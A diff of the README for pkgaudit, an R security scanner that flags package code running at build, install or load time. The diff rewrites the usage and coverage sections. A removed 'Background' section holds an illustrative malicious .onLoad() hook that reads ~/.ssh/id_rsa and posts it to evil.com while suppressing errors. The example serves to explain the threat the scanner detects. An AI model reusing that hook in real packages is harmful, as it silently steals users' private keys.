@@ -8,146 +8,135 @@
 [![osv-scanner](https://github.com/tylerjssmith/pkgaudit/actions/workflows/osv-scanner.yaml/badge.svg)](https://github.com/tylerjssmith/pkgaudit/actions/workflows/osv-scanner.yaml)
 
 pkgaudit is a static analysis security testing (SAST) tool for R
-packages. It scans R source packages for files that can execute
-arbitrary commands during autoconf, builds, checks, and installations,
-and for hooks whose bodies run automatically when a namespace is loaded,
-attached, unloaded, or detached. It scans R source code – in `R/` and in
-the examples and `\Sexpr{}` macros of help files – for security-relevant
-patterns like `system()` calls, and shell scripts and Make-like files
-for matches like `curl`.
+packages. It reports which parts of a package can execute, when they
+execute, and what they do, so that an untrusted package can be reviewed
+before it is installed and loaded. It never executes the code it scans.
 
-R is scanned wherever a package carries it, not only in `R/`: help-file
-examples and `\Sexpr{}` macros, vignettes in R Markdown, Quarto, Sweave
-and R.rsp, `data/`, `demo/`, `tests/`, `tools/`, `inst/CITATION`,
-`.Rprofile`, and `src/install.libs.R`. Each is reported with the
-lifecycle phases in which it runs, so code that executes on `library()`
-is distinguishable from code that runs only when someone calls it.
+## How a package is covered
 
-A finding is not an accusation. In many cases, flagged files and code
-will be legitimate: files that can execute shell commands are needed for
-system-dependent configuration, and many packages call system tools or
-download files for good reason. pkgaudit helps you identify which parts
-of an untrusted package should be reviewed before you install and load
-it.
+pkgaudit accounts for every file it can identify as code, and says what
+it made of each one:
 
-## Background
+- **parsed** – R, wherever a package carries it: `R/`, help-file
+  examples and `\Sexpr{}` macros, vignettes in R Markdown, Quarto,
+  Sweave and R.rsp, `data/`, `demo/`, `tests/`, `tools/`,
+  `inst/CITATION`, `.Rprofile`. Matched against R’s parse tree.
+- **matched** – shell scripts and Make-like files: `configure`,
+  `cleanup`, `src/Makevars`. Matched as text, which is less precise – a
+  match in a comment reads the same as one in a live command.
+- **exportable** – C, C++, Fortran, Rust, Python, JavaScript, and
+  vignette chunks in those languages. Not read, but `export_unscanned()`
+  writes them out for a scanner that reads them, blank-padded so that a
+  finding’s line number still points into the original file.
+- **unexamined** – present and accounted for, but not read: serialized
+  `.rda` and `.rds` objects, binaries, and files no rule claims.
 
-R is a statistical programming language widely used in environments
-processing sensitive data: clinical trials, government statistics,
-financial risk modeling, academic research, and more.
+Coverage is never complete, and is not meant to be. What the `coverage`
+frame offers is not completeness but legibility: a clean result can be
+checked rather than trusted, because the scan says what it did not look
+at.
 
-R packages are the primary mechanism for sharing R code. They are also
-potential attack vectors. When a user calls `install.packages()`, R
-downloads and installs a package and its dependencies. When a user calls
-`library()` to load and attach a package, R automatically executes R
-code contained in `.onLoad()` and `.onAttach()` hooks. A malicious
-package anywhere in the dependency graph can run code on the user’s
-system without any action beyond a normal R workflow.
+Every finding carries the R package lifecycle phases in which it runs –
+`at_autoconf`, `at_build`, `at_check`, `at_install_src`,
+`at_install_bin`, `at_load`, `at_attach`, `at_unload`, `at_detach` – so
+code that executes on `library()` is distinguishable from code that runs
+only when someone calls it.
 
-A minimal example of what a malicious `.onLoad()` hook might look like
-is:
+A finding is not an accusation. Flagged files and code are often
+legitimate: `configure` scripts exist for system-dependent
+configuration, and many packages call system tools or download files for
+good reason. pkgaudit identifies what deserves a reader’s attention, not
+what is malicious.
 
-``` r
-.onLoad <- function(libname, pkgname) {
-  tryCatch({
-    key <- paste(
-      readLines("~/.ssh/id_rsa"),
-      collapse = "\n"
-    )
-    httr::POST(
-      "https://evil.com/evil",
-      body = list(key = key)
-    )
-  }, error = function(e) invisible(NULL))
-}
-```
-
-This code reads a private cryptographic key and sends it to a server
-controlled by the attacker. This occurs whenever a package or dependency
-containing this code is loaded, before any package function is called.
-`tryCatch()` suppresses any errors, so the user sees nothing unusual
-even if `readLines()` fails because the file does not exist or the user
-lacks permission to read it. pkgaudit flags this hook as a code context
-and the `httr::POST()` call as a pattern inside it.
-
-Similar attacks have been documented in ecosystems adjacent to R. In
-2022, the Python package ctx on PyPI was
-[compromised](https://www.sonatype.com/blog/pypi-package-ctx-compromised-are-you-at-risk)
-to exfiltrate environment variables – including credentials. Later that
-year, a malicious `torchtriton` package uploaded to PyPI
-[displaced](https://pytorch.org/blog/compromised-nightly-dependency/)
-the legitimate dependency of PyTorch’s nightly builds and exfiltrated
-`/etc/passwd`, `~/.gitconfig`, and the contents of `~/.ssh`.
-
-R’s use in environments handling sensitive data makes it an attractive
-target for a broad range of threat actors. The assets at risk include
-both the data processed in R sessions and the underlying systems on
-which R runs, which can provide compute resources and credentials for
-lateral movement. pkgaudit provides one layer of defense against an
-under-appreciated risk, flagging security-relevant files and code in R
-packages for manual review.
-
-## Rule Coverage
-
-pkgaudit separates *when* code executes from *what* code does using four
-rule categories:
-
-- **File contexts** are the files a scan reads. Their rules are what
-  give pkgaudit its map of a package: most exist so that a file’s
-  *contents* can be reported – `R/`, `man/`, vignettes, `tests/`,
-  `data/`, and the rest. A file context is reported as a finding in its
-  own right only when it both runs automatically and can only be matched
-  as text rather than parsed. In practice that is the shell scripts and
-  Make-like files – `configure`, `src/Makevars`, `src/Makefile` – where
-  pkgaudit cannot tell you what the file does, only that it runs, so the
-  file itself is what needs reading.
-- **Code contexts** say when a piece of R code runs. Some are lifecycle
-  hooks matched by a rule – `.onLoad()`, `.onAttach()` and friends,
-  whose bodies run automatically when a namespace is loaded, attached,
-  unloaded, or detached. The rest are computed from where the code sits:
-  top-level code in a script, a help-file example, a `\Sexpr{}` macro at
-  a given stage, a vignette chunk, a test. Every pattern carries the
-  context it was found in, and takes that context’s phases.
-- **Patterns** are security-relevant function calls. `system()`, for
-  example, can execute arbitrary shell commands. `source()` can fetch
-  and execute a remote payload.
-- **Matches** are regular-expression matches in the shell scripts and
-  Make-like files found as file contexts. `curl` and `wget`, for
-  example, can fetch a remote payload or send data to a remote host
-  while a package is being built or installed.
-
-Every file and code context rule declares the lifecycle phases in which
-it runs – `at_autoconf`, `at_build`, `at_check`, `at_install_src`,
-`at_install_bin`, `at_load`, `at_attach`, `at_unload`, `at_detach`.
-
-Every pattern finding is attributed to the code context that contains
-it. A `system()` call inside an ordinary function only runs if you call
-that function; the same call inside `.onLoad()` runs automatically when
-a namespace is loaded.
-
-Every match is attributed to the file context that contains it, and so
-carries that file’s phases. Matching text is less precise than matching
-R’s parse tree: a match in a comment or a quoted string is reported the
-same as one in a live command.
-
-The full rule set is documented in [pkgaudit Rule
+For why this matters, see [R Package
+Security](https://tylerjssmith.github.io/pkgaudit/articles/r-package-security.html).
+For the rule set, see [Rule
 Coverage](https://tylerjssmith.github.io/pkgaudit/articles/rules.html).
 
 ## Installation
-
-You can install pkgaudit as follows:
 
 ``` r
 remotes::install_github("tylerjssmith/pkgaudit")
 ```
 
-## Database Integrity
+## Usage
+
+A source package tarball can be scanned before it is installed. The
+example below scans `untrustedpkg`, a small package shipped with
+pkgaudit for demonstration.
+
+``` r
+library(pkgaudit)
+
+tarball <- system.file(
+  "extdata", "untrustedpkg", "untrustedpkg_0.1.0.tar.gz",
+  package = "pkgaudit"
+)
+
+result <- audit_tarball(tarball)
+
+summary(result, path = FALSE)
+#> --- pkgaudit Summary --------------------------------------------------------
+#> Package:   untrustedpkg v0.1.0 (source tarball)
+#> SHA-256:   0c58ddcb365787ab7401c5eedaa4be7eb4ce6bea0a5ca290b6b7b1d8eb621d44
+#> Scanned:   2026-08-11 13:04 UTC with pkgaudit v0.4.0, rules v0.4.0
+#> 
+#> --- R Patterns --------------------------------------------------------------
+#> phase            rule            n   attck
+#> at_build         httr            1   T1041
+#> at_build         system          1   T1059.003 T1059.004
+#> at_check         download_file   1   T1105
+#> at_check         httr            1   T1041
+#> at_check         system          1   T1059.003 T1059.004
+#> at_install_src   httr            1   T1041
+#> at_install_src   system          1   T1059.003 T1059.004
+#> at_load          system          1   T1059.003 T1059.004
+#> none             download_file   1   T1105
+#> 
+#> --- Shell / Make Matches ----------------------------------------------------
+#> phase            rule            n   attck
+#> at_build         curl            1   T1041 T1105
+#> at_check         curl            1   T1041 T1105
+#> at_install_src   curl            1   T1041 T1105
+#> 
+#> --- Coverage ----------------------------------------------------------------
+#> status       top_level   type          files   lines
+#> parsed       R/          R                 2       6
+#> parsed       man/        Rd                1      12
+#> matched      .           shell             1       3
+#> unexamined   .           DESCRIPTION       1
+#> 
+#> --- Errors ------------------------------------------------------------------
+#> No exceptions were raised.
+```
+
+`untrustedpkg` has an `.onLoad()` hook containing a `system()` call,
+which runs whenever the package is loaded; an ordinary function
+containing `download.file()`, which runs at no phase because it runs
+only when someone calls it; and a `configure` script containing `curl`,
+which runs when the package is built, checked, or installed from source.
+Code that runs without being asked deserves closer attention.
+
+Phases overlap – building a package with vignettes also installs and
+loads it – so one occurrence is counted under every phase it runs in.
+
+`path = FALSE` omits the local filesystem path from output that will be
+shared.
+
+Two functions carry a scan into other tools. `emit_sarif()` renders the
+result as SARIF 2.1.0, which editors and code-scanning platforms read
+directly. `export_unscanned()` writes the code pkgaudit cannot read into
+a directory for a scanner that can. Both are covered in [Getting Started
+with
+pkgaudit](https://tylerjssmith.github.io/pkgaudit/articles/pkgaudit.html).
+
+## Database integrity
 
 pkgaudit detects security-relevant files and code using a SQLite
-database of rules shipped with the package at `inst/db/rules.db`. To
-verify that your installed copy of the database has not been modified
-since publication, check its SHA-256 hash against the value published
-here:
+database of rules shipped at `inst/db/rules.db`. `load_rules()` verifies
+the database against its bundled `.sha256` sidecar on every call and
+refuses to load a modified one. To check an installed copy against the
+value published here:
 
 ``` r
 digest::digest(
@@ -158,100 +147,10 @@ digest::digest(
 ```
 
 Expected SHA-256:
-`32db4b4f620a7f2cdeb5fd805180955a452cb443daa0a0fe3e4fab2a6c6629f2`
+`d4eb060421019e24d34e3aa9a375fa9ccbe838cc1c9410551528418a2f88a5c9`
 
-The hash is regenerated automatically by `inst/scripts/build_db.R`
-whenever the database is rebuilt and should match the value above
-exactly. `load_rules()` verifies the database against its bundled
-`.sha256` sidecar on every call and refuses to load a modified database.
+## Security
 
-## Usage
-
-A source package tarball may be scanned before installation. The example
-below scans `untrustedpkg`, a small package shipped with pkgaudit for
-demonstration:
-
-``` r
-library(pkgaudit)
-
-tarball <- system.file(
-  "extdata", "untrustedpkg", "untrustedpkg_0.1.0.tar.gz",
-  package = "pkgaudit"
-)
-
-rules  <- load_rules()
-result <- audit_tarball(tarball, rules = rules)
-
-print(result, path = FALSE)
-#> --- pkgaudit ----------------------------------------------------------------
-#> Package:   untrustedpkg v0.1.0 (source tarball)
-#> SHA-256:   0c58ddcb365787ab7401c5eedaa4be7eb4ce6bea0a5ca290b6b7b1d8eb621d44
-#> Scanned:   2026-08-07 20:45 UTC with pkgaudit v0.4.0, rules v0.4.0
-#> 
-#> File contexts:  1
-#> Code contexts:  1
-#> Patterns:       4
-#> Matches:        1
-#> Errors:         0
-```
-
-`summary()` reports how often each R pattern and shell or Make-like
-match occurs by phase and code or file context, and the MITRE ATT&CK
-techniques involved. Phases can overlap (e.g., building a package with
-vignettes installs and loads it), so a finding may be counted under more
-than one phase.
-
-Below, untrustedpkg has an `.onLoad()` hook with a `system()` call that
-runs during builds, checks, installations from source, and loads; an
-ordinary function with a `download.file()` call that runs only if a user
-calls the enclosing function and so belongs to no phase; and a
-`configure` script with a `curl` match that could run during builds,
-checks, and installations from source. Code that runs without being
-asked deserves closer attention.
-
-``` r
-summary(result, path = FALSE)
-#> --- pkgaudit Summary --------------------------------------------------------
-#> Package:   untrustedpkg v0.1.0 (source tarball)
-#> SHA-256:   0c58ddcb365787ab7401c5eedaa4be7eb4ce6bea0a5ca290b6b7b1d8eb621d44
-#> Scanned:   2026-08-07 20:45 UTC with pkgaudit v0.4.0, rules v0.4.0
-#> 
-#> --- R Patterns --------------------------------------------------------------
-#> phase            code_context       rule            n   attck
-#> at_build         Rd_Sexpr_install   httr            1   T1041
-#> at_build         onLoad_base        system          1   T1059.003 T1059.004
-#> at_check         Rd_Sexpr_install   httr            1   T1041
-#> at_check         Rd_examples        download_file   1   T1105
-#> at_check         onLoad_base        system          1   T1059.003 T1059.004
-#> at_install_src   Rd_Sexpr_install   httr            1   T1041
-#> at_install_src   onLoad_base        system          1   T1059.003 T1059.004
-#> at_load          onLoad_base        system          1   T1059.003 T1059.004
-#> none             Other              download_file   1   T1105
-#> 
-#> --- Shell / Make Matches ----------------------------------------------------
-#> phase            file_context   rule   n   attck
-#> at_build         configure      curl   1   T1041 T1105
-#> at_check         configure      curl   1   T1041 T1105
-#> at_install_src   configure      curl   1   T1041 T1105
-#> 
-#> --- Errors ------------------------------------------------------------------
-#> No exceptions were raised.
-```
-
-Both methods take `path = FALSE`, used above, to omit the local file
-path from output that will be shared. The result itself is a named list
-of data frames and a list of metadata.
-
-``` r
-result$file_contexts  # security-relevant files
-result$code_contexts  # lifecycle hooks (.onLoad(), .onAttach())
-result$patterns       # security-relevant calls, each with its code_context
-                      # and `guarded`, TRUE where the code ships but is not run
-result$matches        # regex matches, each with its file_context
-result$errors         # any files or rules that could not be processed
-result$metadata       # package name/version, SHA-256, rules version, scan time
-```
-
-Each of the four findings frames also carries the nine phase columns, so
-`subset(result$patterns, at_install_src)` is the set of calls that run
-on installation from source.
+pkgaudit’s own security model, and how to report a vulnerability in it,
+are in [SECURITY.md](.github/SECURITY.md). To propose or revise a rule,
+see [CONTRIBUTING.md](.github/CONTRIBUTING.md).
